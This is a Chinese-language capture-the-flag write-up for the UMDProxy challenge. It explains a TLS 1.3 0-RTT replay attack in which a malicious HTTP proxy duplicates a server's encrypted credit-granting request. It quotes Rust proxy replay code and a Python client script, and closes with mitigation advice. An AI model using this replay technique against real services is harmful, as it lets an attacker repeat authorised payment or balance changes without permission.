# UMDProxy

## 题目简述

用户需要 10000 积分才能购买 flag。猜对编程语言 `rust` 和电影 `dune` 分别只能获得 69、420 分；提交一个可用 HTTP 代理则可获得 2000 分，但奖励只能领取一次。题目的决定性机制是后端代理检测器启用了 TLS 1.3 0-RTT，而前置 Nginx 接受并重复处理被重放的 early data。

## 解题过程

代理检测器会通过用户提交的代理建立到挑战站点的 `CONNECT` 隧道，然后在隧道内再次进行 TLS，并发送受内部密钥保护的加分请求：

```text
POST /api/add-credits
Authorization: <server secret>
Content-Type: application/json

{"username":"当前用户","credits":2000}
```

不知道内部密钥也无法解密 TLS，但可以重放加密后的请求。源码中有三个关键条件：

1. TLS 客户端只启用 TLS 1.3，并设置 `enable_early_data = true`。
2. 同一次兑换最多重试 5 次，且各次重试复用同一个 TLS 配置和会话缓存。
3. Nginx 配置了 `ssl_early_data on`，没有对同一份 0-RTT 数据做一次性消费。

官方 `solve.rs` 实现了一个监听 8888 端口的恶意 HTTP 代理。第一次连接时，它分阶段转发 TLS 握手，让客户端拿到会话票据，但故意不把实际加分请求完整送达。检测器发现积分没有增加后会自动重试。

第一次连接的核心顺序是：

```rust
// 转发 ClientHello
transfer(&mut buf, &mut incoming_stream, &mut outgoing_stream).await?;
// 转发服务器握手和会话票据
transfer(&mut buf, &mut outgoing_stream, &mut incoming_stream).await?;
// 只补齐握手所需的一小段客户端数据
incoming_stream.read_exact(&mut buf[0..80]).await?;
outgoing_stream.write_all(&buf[0..80]).await?;
transfer(&mut buf, &mut outgoing_stream, &mut incoming_stream).await?;
```

第二次连接使用会话恢复。由于启用了 0-RTT，加分请求已经作为 early data 跟在最初的 TLS 数据中。恶意代理读出这批仍然加密的字节，并把完全相同的字节发送到 20 个新的目标连接：

```rust
let bytes_read = incoming_stream.read(&mut buf).await?;
let target_addr = "<challenge-host>:<tls-port>";

for _ in 0..20 {
    let mut target = TcpStream::connect(target_addr).await?;
    target.write_all(&buf[..bytes_read]).await?;
    tokio::time::sleep(Duration::from_secs(1)).await;
}
```

每次重放都携带合法的会话票据、0-RTT 密文和内部授权头，因此服务端会多次执行同一个加分请求。20 次重放可增加 $20\times2000=40000$ 分，远超取旗门槛。

实际操作流程如下：

1. 在一台公网可访问的主机上运行 `app/src/bin/solve.rs`，开放 TCP 8888。
2. 注册并登录挑战网站。
3. 向 `/api/redeem-proxy` 提交 `{"proxy_url":"http://攻击机地址:8888"}`。
4. 轮询 `/api/redeem-proxy/check`，并用 `/api/info` 确认积分超过 10000。
5. `POST /api/flag`。

客户端请求可以写成：

```python
import time
import requests

BASE = "https://<challenge-host>"
session = requests.Session()

session.post(
    f"{BASE}/api/register",
    json={"username": "attacker", "password": "attacker-pass"},
    verify=False,
).raise_for_status()
session.post(
    f"{BASE}/api/login",
    json={"username": "attacker", "password": "attacker-pass"},
    verify=False,
).raise_for_status()

session.post(
    f"{BASE}/api/redeem-proxy",
    json={"proxy_url": "http://ATTACKER_PUBLIC_IP:8888"},
    verify=False,
).raise_for_status()

while True:
    status = session.get(
        f"{BASE}/api/redeem-proxy/check",
        verify=False,
    ).text
    if status != "pending":
        break
    time.sleep(1)

print(session.get(f"{BASE}/api/info", verify=False).text)
print(session.post(f"{BASE}/api/flag", verify=False).text)
```

最终得到：

```text
UMDCTF{YoU_w1lL_n3Ver_rEaCh_7H3_tRuTh}
```

赛时没有提供后端源码；公开仓库中的固定授权密钥属于赛后审计证据，不能把“源码里直接看到密钥”误写成原题解法。官方解题脚本证明预期攻击是 TLS 1.3 early data 重放。

## 方法总结

0-RTT 允许客户端在完整握手结束前发送应用数据，但这些数据天然可能被重放，不能直接承载非幂等的加余额操作。题目通过恶意代理先诱导一次失败以建立可恢复会话，再复制第二次连接的 early data，使带秘密授权的请求在无需解密的情况下执行多次。服务端应拒绝在 0-RTT 中处理余额、支付或状态变更请求，并启用可靠的 anti-replay 机制。
